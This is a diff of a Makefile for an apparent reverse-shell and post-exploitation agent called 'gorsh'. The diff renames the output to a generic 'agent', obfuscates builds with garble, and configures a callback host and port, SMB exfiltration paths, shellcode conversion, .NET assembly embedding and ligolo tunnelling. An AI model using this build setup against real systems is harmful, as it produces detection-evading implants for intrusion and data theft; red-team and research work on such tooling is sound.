@@ -1,20 +1,40 @@
 ##############
+# DEPENDENCY MANAGEMENT
+##############
+LIGOLO = ${HOME}/.local/bin/ligolo
+GODONUT = ${GOPATH}/bin/go-donut
+GARBLE = ${GOPATH}/bin/garble
+FZF = ${GOPATH}/bin/fzf
+
+$(LIGOLO):
+	go install github.com/tnpitsecurity/ligolo-ng@latest
+$(GODONUT):
+	go install github.com/Binject/go-donut@latest
+$(GARBLE):
+	go install mvdan.cc/garble@latest
+$(FZF):
+	go install github.com/junegunn/fzf@latest
+
+##############
 #  CONFIGS
 ##############
 # used for artifact naming
-APP ?= gorsh
-SERVER = ${OUT}/${APP}-server
+APP ?= agent
+SERVER = ./server
+
 # artifact output directory
 OUT ?= build
+
 # build command prefix
-BUILD = go build
-# BUILD = go build
+BUILD = $(GARBLE) -seed=random -literals -tiny build
+
 # operation systems to build for
 PLATFORMS = linux windows darwin
+
 # host the reverse shell will call back to
 LHOST ?= localhost
-# port the reverse shell will call back to
 LPORT ?= 8443
+
 # exfil and tool path to serve over smb
 TOOLS ?= /srv
 EXFIL ?= /srv
@@ -22,6 +42,20 @@ EXFIL ?= /srv
 ASSEMBLY_PATH = pkg/execute_assembly/embed
 assembly_repo = https://api.github.com/repos/flangvik/sharpcollection/contents/
 target_vers = 4.5
+
+
+##############
+#    SET SSL
+#  CERTIFICATES
+##############
+SRV_KEY = certs/server.key
+SRV_PEM = certs/server.pem
+FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
+
+$(SRV_KEY) $(SRV_PEM) &:
+	mkdir -p certs
+	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
+	@cat ${SRV_KEY} >> ${SRV_PEM}
 
 
 ##############
@@ -43,14 +77,21 @@ target = $(word 1, $@)
 ##############
 all: $(PLATFORMS) shellcode dll ## makes all windows, shellcode, dll, linux, darwin targets
 
-${PLATFORMS}: $(SRV_KEY) $(GARBLE) ## one of: windows, linux, darwin
+linux: $(SRV_KEY) $(GARBLE) ## make the linux agent
 	GOOS=${target} ${BUILD} \
 		-buildmode pie \
 		-ldflags ${LDFLAGS} \
-		-o ${OUT}/${APP}.${target} \
+		-o ${OUT}/${APP}_linux \
 		cmd/gorsh/main.go
 
-$(SERVER): $(SRV_KEY) ## make the listening server
+windows: $(SRV_KEY) ## make the windows agent
+	GOOS=${target} ${BUILD} \
+		-buildmode pie \
+		-ldflags ${LDFLAGS} \
+		-o ${OUT}/${APP}.exe \
+		cmd/gorsh/main.go
+
+server: $(SRV_KEY) ## make the listening server
 	${BUILD} \
 		-buildmode pie \
 		-ldflags ${LDFLAGS} \
@@ -79,7 +120,7 @@ listen: $(SERVER) ## start listening for callbacks on LPORT
 # LIGOLO MGMT
 ##############
 start-ligolo:  ## configures the necessary tun interfaces and starts ligolo. requires root
-	sudo ip tuntap add user player1 ligolo mode tun
+	sudo ip tuntap add user $LOGNAME mode tun ligolo
 	sudo ip link set ligolo up
 	$(LIGOLO) -selfcert
 
@@ -132,35 +173,6 @@ clean: ## reset the project
 
 superclean: clean ## also delete assemblies and certs
 	rm pkg/execute_assembly/embed/* certs/*
-
-
-##############
-# DEPENDENCY MANAGEMENT
-##############
-LIGOLO = ${HOME}/.local/bin/ligolo
-GODONUT = ${GOPATH}/bin/go-donut
-GARBLE = ${GOPATH}/bin/garble
-FZF = ${GOPATH}/bin/fzf
-
-$(LIGOLO):
-	go install github.com/tnpitsecurity/ligolo-ng@latest
-$(GODONUT):
-	go install github.com/Binject/go-donut@latest
-$(GARBLE):
-	go install mvdan.cc/garble@latest
-$(FZF):
-	go install github.com/junegunn/fzf@latest
-
-
-# TLS cert targets
-SRV_KEY = certs/server.key
-SRV_PEM = certs/server.pem
-FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
-
-$(SRV_KEY) $(SRV_PEM) &:
-	mkdir -p certs
-	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
-	@cat ${SRV_KEY} >> ${SRV_PEM}
 
 
 ##############
